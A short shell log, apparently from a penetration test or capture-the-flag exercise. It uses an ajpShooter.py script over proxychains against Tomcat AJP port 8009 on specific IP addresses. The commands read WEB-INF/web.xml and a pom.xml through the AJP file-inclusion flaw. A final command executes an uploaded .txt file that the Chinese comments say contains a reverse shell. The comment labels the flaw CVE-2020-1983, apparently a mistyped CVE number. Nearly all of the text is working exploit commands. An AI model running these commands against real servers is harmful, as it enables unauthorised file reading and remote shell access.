```sh
root@kali-server:~# proxychains4 -q python3 ajpShooter.py http://172.30.12.236:8080 8009 /WEB-INF/web.xml read
# 找到         <servlet-class>com.remote.fastjson.LoginServlet</servlet-class>
root@kali-server:~# proxychains4 -q python3 ajpShooter.py http://172.30.12.236:8080 8009 /META-INF/maven/com.remote/fastjson/pom.xml read

# 文件包含 读取
python3 ajpShooter.py http://39.99.243.178:8080 8009 /WEB-INF/web.xml read
# 文件包含 CVE-2020-1983 运行文件, .txt内容为反弹shell
python3 ajpShooter.py http://39.99.243.178:8080 8009 /upload/449aeddf75375deb7ab4a6f4d5744b82/20231013105121244.txt eval
```
